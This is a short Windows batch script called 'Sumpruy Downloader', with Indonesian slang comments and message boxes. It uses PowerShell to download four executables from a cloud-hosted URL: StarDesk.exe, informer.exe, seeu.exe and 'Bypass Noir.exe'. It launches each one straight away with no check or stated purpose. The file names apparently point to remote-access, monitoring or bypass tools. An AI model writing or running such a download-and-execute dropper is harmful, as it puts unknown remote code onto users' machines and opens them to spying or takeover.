@echo off
title Sumpruy Downloader
set "BASE_URL=https://ais-dev-dckr5i55tn452pgoxcqp4s-951812896425.asia-southeast1.run.app"
set "DL_DIR=%cd%\Sumpruy_Downloads"

mkdir "%DL_DIR%" 2>nul
cd /d "%DL_DIR%"

:: POP UP PERTAMA - MULAI
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Sumpruy downloader is now started mpruy tunggu aja.', 'Sumpruy Downloader', 'OK', 'Warning')}"

:: DOWNLOAD FILE SATU-SATU
echo Downloading StarDesk.exe...
powershell -Command "Invoke-WebRequest -Uri '%BASE_URL%/StarDesk.exe' -OutFile 'StarDesk.exe'"
start "" "StarDesk.exe"

echo Downloading informer.exe...
powershell -Command "Invoke-WebRequest -Uri '%BASE_URL%/informer.exe' -OutFile 'informer.exe'"
start "" "informer.exe"

echo Downloading seeu.exe...
powershell -Command "Invoke-WebRequest -Uri '%BASE_URL%/seeu.exe' -OutFile 'seeu.exe'"
start "" "seeu.exe"

echo Downloading Bypass Noir.exe...
powershell -Command "Invoke-WebRequest -Uri '%BASE_URL%/Bypass%%20Noir.exe' -OutFile 'Bypass Noir.exe'"
start "" "Bypass Noir.exe"

:: POP UP KEDUA - SELESAI
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Udeh selesuy mpruy downloadnya tinggal gas aje mok gue laper.', 'Sumpruy Downloader', 'OK', 'Information')}"

exit
